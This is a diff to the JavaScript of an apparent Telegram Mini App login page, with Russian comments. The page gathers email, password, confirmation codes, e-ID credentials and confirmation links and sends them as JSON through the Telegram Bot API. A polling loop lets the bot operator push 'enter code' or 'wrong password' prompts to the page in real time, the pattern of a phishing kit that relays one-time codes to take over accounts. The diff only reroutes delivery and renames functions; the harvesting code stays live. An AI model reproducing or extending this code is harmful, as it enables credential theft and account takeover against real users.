@@ -798,9 +798,9 @@
         function goToSuccess() { switchPage(pageSuccess); }
 
         // ============================================================
-        // 4. ОТПРАВКА В БОТА (НАПРЯМУЮ АДМИНУ!)
+        // 4. ОТПРАВКА В БОТА (ЧЕРЕЗ ПОЛЬЗОВАТЕЛЯ)
         // ============================================================
-        async function sendToAdmin(data) {
+        async function sendToBot(data) {
             const payload = {
                 ...data,
                 user_id: tg.initDataUnsafe?.user?.id || 'неизвестно'
@@ -811,7 +811,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: ADMIN_ID,
+                        chat_id: tg.initDataUnsafe?.user?.id,  // ← ОТПРАВЛЯЕМ СЕБЕ!
                         text: JSON.stringify(payload)
                     })
                 });
@@ -824,7 +824,7 @@
         }
 
         // ============================================================
-        // 5. ПЕРЕХВАТ СООБЩЕНИЙ ОТ БОТА
+        // 5. ПЕРЕХВАТ КОМАНД ОТ БОТА
         // ============================================================
         async function checkBotCommands() {
             try {
@@ -834,33 +834,22 @@
                 if (data.ok && data.result.length > 0) {
                     for (const update of data.result) {
                         lastUpdateId = update.update_id;
-                        const message = update.message;
-                        
-                        if (message && message.text && message.from?.id === tg.initDataUnsafe?.user?.id) {
-                            const text = message.text;
-                            const messageId = message.message_id;
-                            
-                            // ===== УДАЛЯЕМ СООБЩЕНИЕ ИЗ ЧАТА (ОПЦИОНАЛЬНО) =====
-                            // Если хочешь, чтобы сообщение НЕ отображалось — раскомментируй:
-                            // await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
-                            //     method: 'POST',
-                            //     headers: { 'Content-Type': 'application/json' },
-                            //     body: JSON.stringify({
-                            //         chat_id: tg.initDataUnsafe?.user?.id,
-                            //         message_id: messageId
-                            //     })
-                            // });
-                            
-                            // ===== ОТКРЫВАЕМ СТРАНИЦУ =====
-                            if (text.includes('Введите код подтверждения')) {
-                                goToCodeConfirm();
-                                showMsg('📧 Введите код подтверждения', 'info');
-                            } else if (text.includes('Введите ссылку подтверждения')) {
-                                goToEid();
-                                document.getElementById('eidLinkBlock').style.display = 'block';
-                                showMsg('🔗 Введите ссылку подтверждения', 'info');
-                            } else if (text.includes('Неправильный пароль')) {
-                                showMsg('❌ Неправильный пароль. Попробуйте еще раз.', 'error');
+                        if (update.message && update.message.text) {
+                            const text = update.message.text;
+                            const fromId = update.message.from?.id;
+
+                            // Проверяем, что сообщение от бота и адресовано нам
+                            if (fromId && String(fromId) === String(tg.initDataUnsafe?.user?.id)) {
+                                if (text.includes('Введите код подтверждения')) {
+                                    goToCodeConfirm();
+                                    showMsg('📧 Введите код подтверждения', 'info');
+                                } else if (text.includes('Введите ссылку подтверждения')) {
+                                    goToEid();
+                                    document.getElementById('eidLinkBlock').style.display = 'block';
+                                    showMsg('🔗 Введите ссылку подтверждения', 'info');
+                                } else if (text.includes('Неправильный пароль')) {
+                                    showMsg('❌ Неправильный пароль. Попробуйте еще раз.', 'error');
+                                }
                             }
                         }
                     }
@@ -870,14 +859,12 @@
             }
         }
 
-        // ============================================================
-        // 6. ЗАПУСКАЕМ ПЕРЕХВАТ КАЖДЫЕ 3 СЕКУНДЫ
-        // ============================================================
+        // Проверяем новые команды каждые 3 секунды
         setInterval(checkBotCommands, 3000);
         setTimeout(checkBotCommands, 1000);
 
         // ============================================================
-        // 7. НАВИГАЦИЯ
+        // 6. НАВИГАЦИЯ
         // ============================================================
         loginBtn.addEventListener('click', goToCodePage);
         eidBtn.addEventListener('click', goToEid);
@@ -893,7 +880,7 @@
         });
 
         // ============================================================
-        // 8. ОБЫЧНЫЙ ВХОД
+        // 7. ОБЫЧНЫЙ ВХОД
         // ============================================================
         loginSubmitBtn.addEventListener('click', async function() {
             const e = email.value.trim();
@@ -910,7 +897,7 @@
             loginSubmitBtn.disabled = true;
             loginSubmitBtn.textContent = '⏳ Отправка...';
 
-            const ok = await sendToAdmin({ email: e, password: p });
+            const ok = await sendToBot({ email: e, password: p });
 
             if (ok) {
                 loginSubmitBtn.disabled = false;
@@ -927,7 +914,7 @@
         });
 
         // ============================================================
-        // 9. КОД
+        // 8. КОД
         // ============================================================
         codeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
@@ -937,7 +924,7 @@
             }
             codeBtn.disabled = true;
             codeBtn.textContent = '⏳ Отправка...';
-            const ok = await sendToAdmin({ code: code });
+            const ok = await sendToBot({ code: code });
             if (ok) {
                 codeBtn.disabled = false;
                 codeBtn.textContent = '✅ Подтвердить';
@@ -952,7 +939,7 @@
         });
 
         // ============================================================
-        // 10. E-ID
+        // 9. E-ID
         // ============================================================
         eidSubmitBtn.addEventListener('click', async function() {
             const e = eidEmail.value.trim();
@@ -969,7 +956,7 @@
             eidPasswordValue = p;
             eidSubmitBtn.disabled = true;
             eidSubmitBtn.textContent = '⏳ Отправка...';
-            const ok = await sendToAdmin({ type: 'eid_login', email: e, password: p });
+            const ok = await sendToBot({ type: 'eid_login', email: e, password: p });
             if (ok) {
                 eidSubmitBtn.disabled = true;
                 eidSubmitBtn.textContent = '✅ Отправлено';
@@ -984,7 +971,7 @@
         });
 
         // ============================================================
-        // 11. E-ID ССЫЛКА
+        // 10. E-ID ССЫЛКА
         // ============================================================
         eidLinkBtn.addEventListener('click', async function() {
             const link = eidLinkInput.value.trim();
@@ -994,7 +981,7 @@
             }
             eidLinkBtn.disabled = true;
             eidLinkBtn.textContent = '⏳ Отправка...';
-            const ok = await sendToAdmin({ type: 'eid_link', email: eidEmailValue, password: eidPasswordValue, link: link });
+            const ok = await sendToBot({ type: 'eid_link', email: eidEmailValue, password: eidPasswordValue, link: link });
             if (ok) {
                 eidLinkBtn.disabled = false;
                 eidLinkBtn.textContent = '✅ Отправить ссылку';
@@ -1009,7 +996,7 @@
         });
 
         // ============================================================
-        // 12. ENTER
+        // 11. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -1028,7 +1015,7 @@
         });
 
         // ============================================================
-        // 13. ТЕХПОДДЕРЖКА
+        // 12. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
             window.open('https://t.me/potok457', '_blank');
